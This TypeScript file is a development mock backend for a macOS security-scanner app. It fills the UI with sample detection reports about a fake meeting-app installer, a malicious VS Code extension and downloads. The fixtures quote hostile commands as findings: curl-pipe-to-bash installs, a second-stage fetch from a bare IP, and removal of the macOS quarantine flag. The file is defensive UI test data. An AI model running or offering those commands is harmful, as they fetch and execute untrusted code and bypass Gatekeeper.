// Loaded only in development and outside Tauri (the vite URL opened in a plain browser):
// gives the UI a fake backend so styles can be tuned in the browser. The bundled App never includes this file.
// The text is English because the backend defaults to English.

const now = new Date();
const ago = (min: number) => {
  const d = new Date(now.getTime() - min * 60_000);
  const p = (n: number) => String(n).padStart(2, "0");
  return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())}T${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
};

const historyEntries = [
  {
    id: "1",
    time: ago(3),
    source: "terminal",
    title: "curl -fsSL https://zeff-meet.app/install.sh | bash",
    cwd: "/Users/oliver",
    action: "cancelled",
    report: {
      verdict: "block",
      summary: "This is a fake meeting app's install script: it removes the quarantine flag, downloads its own Node.js, then fetches a second-stage script from a bare IP address.",
      reasons: ["The download domain zeff-meet.app was registered only 12 days ago", "The script hides its second stage in ~/.task and runs it there, which normal installers never do"],
      advice: "Do not run it. If an \"interviewer\" or \"client\" sent it, report this command and their contact details to the hiring platform.",
      source: "ai",
      model: "claude-opus-5-5",
      findings: [
        { severity: "high", message: "Removes the macOS quarantine flag (bypasses Gatekeeper security checks)", where: "install.sh", snippet: "xattr -d com.apple.quarantine /Applications/Zeff.app" },
        { severity: "high", message: "The download domain zeff-meet.app was registered only 12 days ago", where: "https://zeff-meet.app/install.sh" },
        { severity: "medium", message: "The script downloads and runs another script (multi-stage delivery)", where: "install.sh", snippet: "curl -s http://198.51.100.9:1224/task/mac | bash" },
      ],
    },
  },
  {
    id: "2",
    time: ago(42),
    source: "download",
    title: "/Users/oliver/Downloads/Zeff-Meeting-2.4.dmg",
    cwd: "",
    action: "notified",
    report: {
      verdict: "warn",
      summary: "The installer has no developer signature and is not notarized by Apple.",
      reasons: [],
      advice: "",
      source: "offline",
      model: "",
      findings: [{ severity: "medium", message: "The app has no developer signature", where: "Zeff.app" }],
    },
  },
  {
    id: "3",
    time: ago(130),
    source: "terminal",
    title: "npm install",
    cwd: "/Users/oliver/code/online-store",
    action: "executed",
    report: { verdict: "allow", summary: "All dependencies come from the official npm registry; no suspicious install scripts found.", reasons: [], advice: "", source: "ai", model: "claude-opus-5-5", findings: [] },
  },
  {
    id: "4",
    time: ago(60 * 26),
    source: "extension",
    title: "/Users/oliver/.vscode/extensions/themes-darcula-pro-1.0.2",
    cwd: "",
    action: "quarantined",
    quarantine_id: "q1",
    report: {
      verdict: "block",
      summary: "The extension hides 64 invisible characters in its code that decode to code reading ~/.ssh.",
      reasons: [],
      advice: "",
      source: "offline",
      model: "",
      findings: [{ severity: "high", message: "The code hides a run of 64 consecutive invisible Unicode characters", where: "extension.js" }],
    },
  },
  {
    id: "5",
    time: ago(60 * 50),
    source: "ai_tool",
    title: "Claude Code · fetch-helper (MCP server)",
    cwd: "",
    action: "allowed",
    report: { verdict: "allow", summary: "An official package pinned to a version.", reasons: [], advice: "", source: "offline", model: "", findings: [] },
  },
];

const config = {
  provider: "claude_cli",
  claude: { api_key: "", model: "claude-opus-5-5", effort: "low", cli_path: "" },
  openai_compatible: { base_url: "http://127.0.0.1:11434/v1", model: "", api_key: "", preset: "ollama", trusted: false },
  watch_downloads: true,
  watch_extensions: true,
  auto_quarantine: true,
  watch_ai_tools: true,
  intel: { auto_update: true, abusech_key: "", online_lookup: true, rules_url: "", virustotal_key: "" },
  scan: { scheduled: true, folders: ["~/Downloads", "/Users/oliver/code"], interval_days: 7 },
};

const quarantine = [
  { id: "q1", original: "/Users/oliver/.vscode/extensions/themes-darcula-pro-1.0.2", stored: "", time: ago(60 * 26), reason: "The extension hides invisible characters in its code" },
];

// With ?paused in the URL it opens paused, to preview the paused look
let paused = location.search.includes("paused");

const handlers: Record<string, (args: Record<string, unknown>) => unknown> = {
  set_paused: (a) => {
    paused = a.paused as boolean;
  },
  delete_entry_file: () => null,
  get_overview: () => ({
    paused,
    shell_hook: { installed: true, cli_found: true, cli_path: "~/.tsuba/bin/tsuba" },
    watch_downloads: true,
    watch_extensions: true,
    watch_ai_tools: true,
    downloads_dir: "/Users/oliver/Downloads",
    extension_dirs: ["/Users/oliver/.vscode/extensions", "/Users/oliver/.cursor/extensions"],
    provider: "claude_cli",
    provider_label: "Claude Code account · claude-opus-5-5",
    ai_available: true,
    sandbox_available: true,
    recent: { total: 128, warned: 6, blocked: 2 },
    quarantined: quarantine.length,
    trusted: 3,
  }),
  get_history: () => historyEntries,
  get_config: () => config,
  quarantine_list: () => quarantine,
  trusted_list: () => [{ key: "path:/Users/oliver/code/tsuba", fingerprint: "", label: "/Users/oliver/code/tsuba", time: ago(60 * 70) }],
  scan_schedule_status: () => ({ last: ago(60 * 30) }),
  intel_status: () => ({
    updated: ago(200),
    sources: [
      { id: "ossf", name: "OpenSSF Malicious Packages", license: "Apache-2.0", url: "", version: "", updated: "", count: 231842 },
      { id: "vscode", name: "VS Code malicious extension list", license: "-", url: "", version: "", updated: "", count: 412 },
      { id: "elastic", name: "Elastic YARA rules", license: "Elastic License 2.0", url: "", version: "", updated: "", count: 1288 },
      { id: "xprotect", name: "XProtect on this Mac", license: "Apple", url: "", version: "", updated: "", count: 391 },
    ],
  }),
  detect_claude_cli: () => "/Users/oliver/.local/bin/claude",
  run_doctor: () => new Promise((r) => setTimeout(() => r({ findings: [], advice: "" }), 900)),
  scan_installed_extensions: () =>
    new Promise((r) =>
      setTimeout(
        () =>
          r([
            { id: "themes.darcula-pro", path: "/x/a", verdict: "warn", findings: [{ severity: "medium", message: "Activates on startup and runs system commands", where: "extension.js" }] },
            { id: "ms-python.python", path: "/x/b", verdict: "allow", findings: [] },
          ]),
        900,
      ),
    ),
  scan_ai_tools: () => new Promise((r) => setTimeout(() => r([]), 1500)),
  scan_folder: () =>
    new Promise((r) =>
      setTimeout(
        () =>
          r({
            root: "/Users/oliver/Downloads",
            checked: 14,
            unchanged: 31,
            truncated: false,
            hits: [
              { path: "/Users/oliver/Downloads/Zeff-Meeting-2.4.dmg", kind: "installer", verdict: "block", summary: "An unsigned executable is hidden in a hidden folder of the disk image", findings: [{ severity: "high", message: "An executable is hidden in a hidden folder of the disk image: .back/installer", where: "Zeff.dmg" }], fresh: true },
              { path: "/Users/oliver/Downloads/interview-task", kind: "project", verdict: "warn", summary: "VS Code runs a task automatically when this folder is opened", findings: [{ severity: "medium", message: "VS Code runs a task automatically when this folder is opened (runOn: folderOpen)", where: ".vscode/tasks.json" }], fresh: false },
            ],
          }),
        1200,
      ),
    ),
  choose_folder: () => "/Users/oliver/Downloads",
};

let callbackId = 0;
(window as unknown as Record<string, unknown>).__TAURI_INTERNALS__ = {
  metadata: { currentWindow: { label: "main" }, currentWebview: { windowLabel: "main", label: "main" } },
  transformCallback: () => ++callbackId,
  unregisterCallback: () => {},
  invoke: async (cmd: string, args: Record<string, unknown> = {}) => {
    if (cmd.startsWith("plugin:event|")) return ++callbackId;
    const h = handlers[cmd];
    if (!h) {
      console.info("[devMock] no mock for command", cmd, args);
      return null;
    }
    return h(args);
  },
};
(window as unknown as Record<string, unknown>).__TAURI_EVENT_PLUGIN_INTERNALS__ = { unregisterListener: () => {} };
export {};
